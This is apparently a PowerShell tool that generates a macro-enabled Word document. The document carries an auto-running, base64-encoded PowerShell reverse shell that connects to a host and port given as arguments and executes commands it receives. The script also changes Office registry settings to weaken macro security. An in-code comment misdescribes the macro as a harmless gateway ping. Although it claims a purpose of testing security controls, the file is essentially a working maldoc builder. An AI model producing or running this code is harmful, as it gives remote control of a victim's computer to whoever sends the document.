<#
author : thehunt1s0n


.SYNOPSIS
This file is intended for testing purposes only.
Any unauthorized use of this script is strictly prohibited!!

.DESCRIPTION
The script generates a Microsoft Word document with a VBA macro. The VBA code within the macro can be customized.

.NOTES
Microsoft Word needs to be already installed in the system

This script was developed to aid in testing the effectiveness of security controls in detecting and alerting on Word documents containing macros.

#>

###############################################################################
# Encode the payload.
###############################################################################

$Payload = '$client = New-Object System.Net.Sockets.TCPClient("'+$args[0]+'",'+$args[1]+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

#$Text = $args[0]

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Payload)

$EncodedText =[Convert]::ToBase64String($Bytes)

###############################################################################
# Split the generated encoded payload.
###############################################################################

$EncodedText = if ($EncodedText.Length -gt 0) { $EncodedText } else { "" }

$str = 'powershell -nop -w hidden -e ' + $EncodedText

$n = 50

$outputVariable = ""

for ($i = 0; $i -lt $str.Length; $i += $n) {
    $substring = $str.Substring($i, [Math]::Min($n, $str.Length - $i))
    $output = 'Str = Str + "' + $substring + '"'
    $outputVariable += $output + "`n"
}




#CREATE A WORD .doc FILE

$line = [Environment]::NewLine

$logo = @"

          _____                    _____                    _____                    _____                   _______         
         /\    \                  /\    \                  /\    \                  /\    \                 /::\    \        
        /::\____\                /::\    \                /::\    \                /::\    \               /::::\    \       
       /::::|   |               /::::\    \              /::::\    \              /::::\    \             /::::::\    \      
      /:::::|   |              /::::::\    \            /::::::\    \            /::::::\    \           /::::::::\    \     
     /::::::|   |             /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \         /:::/~~\:::\    \    
    /:::/|::|   |            /:::/__\:::\    \        /:::/  \:::\    \        /:::/__\:::\    \       /:::/    \:::\    \   
   /:::/ |::|   |           /::::\   \:::\    \      /:::/    \:::\    \      /::::\   \:::\    \     /:::/    / \:::\    \  
  /:::/  |::|___|______    /::::::\   \:::\    \    /:::/    / \:::\    \    /::::::\   \:::\    \   /:::/____/   \:::\____\ 
 /:::/   |::::::::\    \  /:::/\:::\   \:::\    \  /:::/    /   \:::\    \  /:::/\:::\   \:::\____\ |:::|    |     |:::|    |
/:::/    |:::::::::\____\/:::/  \:::\   \:::\____\/:::/____/     \:::\____\/:::/  \:::\   \:::|    ||:::|____|     |:::|    |
\::/    / ~~~~~/:::/    /\::/    \:::\  /:::/    /\:::\    \      \::/    /\::/   |::::\  /:::|____| \:::\    \   /:::/    / 
 \/____/      /:::/    /  \/____/ \:::\/:::/    /  \:::\    \      \/____/  \/____|:::::\/:::/    /   \:::\    \ /:::/    /  
             /:::/    /            \::::::/    /    \:::\    \                    |:::::::::/    /     \:::\    /:::/    /   
            /:::/    /              \::::/    /      \:::\    \                   |::|\::::/    /       \:::\__/:::/    /    
           /:::/    /               /:::/    /        \:::\    \                  |::| \::/____/         \::::::::/    /     
          /:::/    /               /:::/    /          \:::\    \                 |::|  ~|                \::::::/    /      
         /:::/    /               /:::/    /            \:::\    \                |::|   |                 \::::/    /       
        /:::/    /               /:::/    /              \:::\____\               \::|   |                  \::/____/        
        \::/    /                \::/    /                \::/    /                \:|   |                   ~~              
         \/____/                  \/____/                  \/____/                  \|___|                                   
                                                                                                                                                                                      
            
"@

$label = @"  
                            This is a script that create a word document macro enabled file 
                             This script is meant to be used only for educational purposes
                                                made by thehunt1s0n 
"@

###############################################################################
# The function below generates random letters and numbers so that we can use 
#them later to rename the generated doc file. 
###############################################################################

function Get-RandomAlphaNum($len)
{
	$r = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	$tmp = foreach ($i in 1..[int]$len) {$r[(Get-Random -Minimum 1 -Maximum $r.Length)]}
	return [string]::Join('', $tmp)
}

###############################################################################
# Place your custom macro vba code between the code=@" and "@ lines.
# Sample VBA code 
###############################################################################

function New-MacroWordDoc(){

$code = @"
'The included VBA code samplke uses a PowerShell encoded command to looks-up a compuetrs assigned ip default-gateway address and pings it 5 times. Ping results are displayed in a message box.
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
   Dim Str As String
    
   $outputVariable
  
   CreateObject("Wscript.Shell").Run Str
End Sub
"@

[ref]$SaveFormat = "microsoft.office.interop.word.WdSaveFormat" -as [type]
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.Vbe.Interop") | Out-Null
#$docName = Read-Host "Enter a name for the document but do not include file extension"
$docName = Get-RandomAlphaNum 5
$word = New-Object -ComObject word.application
$word.visible = $false
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$($word.Version)\word\Security" -Name AccessVBOM -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$($word.Version)\word\Security" -Name VBAWarnings -Value 1 -Force | Out-Null
$doc = $word.documents.add()
$selection = $word.selection
$selection.typeText("The word document has been generated.")
$docmodule = $doc.VBProject.VBComponents.item(1)
$docmodule.CodeModule.AddFromString($code)
$doc.SaveAs("C:\Users\Public\$docName.doc", [microsoft.office.interop.word.WdSaveFormat]::wdFormatDocument97)
Write-Host "Check C:\Users\Public"
$word.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($word) | out-null
if (Get-Process winword){Stop-Process -name winword}

#####################################################################################
# Saving the document in the current user's desktop
#####################################################################################

#$file = ("$($ENV:UserProfile)\Desktop\$docName.doc")
$file = ("C:\Users\Public\$docName.doc")
$file
}
Write-Host -f Magenta $logo
Write-Host
Write-Host -f Green $label
Write-Host "The payload has been encoded." 
Write-Host "The encoded payload has been split."
New-MacroWordDoc